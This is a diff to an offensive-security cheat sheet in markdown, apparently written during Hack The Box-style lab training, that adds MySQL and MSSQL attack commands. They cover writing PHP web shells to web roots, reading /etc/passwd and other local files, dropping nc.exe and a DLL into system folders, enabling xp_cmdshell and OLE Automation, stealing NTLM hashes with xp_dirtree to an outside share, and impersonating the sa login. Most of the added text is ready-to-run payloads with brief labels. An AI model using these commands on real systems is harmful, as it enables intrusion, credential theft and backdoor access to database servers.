@@ -14,6 +14,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [sqsh](#sqsh)
   - [file transfer](#file-transfer)
   - [ligolo](#ligolo)
   - [netcat](#netcat)
@@ -481,7 +482,7 @@ PRIMARY KEY (id)
 # list the table structure with its fields and data types.
 DESCRIBE logins;
 
-# general usage
+# General usage
 show databases;
 use user;
 show tables;
@@ -500,16 +501,23 @@ UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition
 UPDATE logins SET password = 'change_password' WHERE id > 1;
 update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"
 
-# Upload a php file
+# Read Local Files in MySQL
+select LOAD_FILE("/etc/passwd");
+
+
+# Upload/write a php file
 select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile "/srv/http/cmd.php"
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+
+# Secure File Privileges
+show variables like "secure_file_priv";
 
 # Move Files
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
 
-#remove tables and databases
+# Remove tables and databases
 DROP TABLE logins;
 
 # ALTER Statement(change the name of any table and any of its fields or to delete or add a new column to an existing table)
@@ -757,6 +765,109 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### sqsh
+```bash
+sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+```
+
+### sqlcmd
+MSSQL
+```bash
+sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+
+# display all databases
+1> SELECT name FROM master.dbo.sysdatabases
+2> GO
+
+# choose database
+1> USE htbusers
+2> GO
+
+# show tables
+1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+2> GO
+
+# select columns from users table;
+1> SELECT * FROM users
+2> go
+
+-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+GO
+
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
+
+# enable xp_cmdshell
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
+
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
+
+
+# To write files using MSSQL, we need to enable Ole Automation Procedures
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+
+# Create a File
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+
+# Read Local Files in MSSQL
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+# XP_DIRTREE Hash Stealing
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+
+# XP_SUBDIRS Hash Stealing
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+
+# Identify Users that We Can Impersonate
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+# Verifying our Current User and Role
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+# Impersonating the SA User
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+# Identify linked Servers in MSSQL
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+```
+
 ### file transfer
 https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Uploading_Files_to_Attackers_HTTP_Server
 ```bash
